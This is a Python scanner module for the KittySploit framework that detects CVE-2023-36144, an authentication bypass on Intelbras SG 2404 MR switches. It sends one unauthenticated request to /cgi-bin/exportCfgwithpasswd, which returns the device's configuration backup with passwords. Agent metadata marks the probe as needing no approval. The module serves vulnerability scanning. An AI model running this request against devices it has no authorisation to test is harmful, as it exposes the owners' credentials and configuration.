#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An authentication bypass in Intelbras Switch SG 2404 MR in firmware 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Intelbras Switch - Information Disclosure Detection',
        'description': 'An authentication bypass in Intelbras Switch SG 2404 MR in firmware 1.00.54 allows an unauthenticated attacker to download the backup file of the device, exposing critical information about the device configuration.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'intelbras', 'switch', 'exposure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-36144',
            'https://github.com/leonardobg/CVE-2023-36144',
            'http://intelbras.com',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2023-36144',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/exportCfgwithpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('System Description', 'System Version', 'System Name',)
        header_any = ('attachment;filename=',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Intelbras Switch - Information Disclosure detected",
                path='/cgi-bin/exportCfgwithpasswd',
            )
            return True
        return False

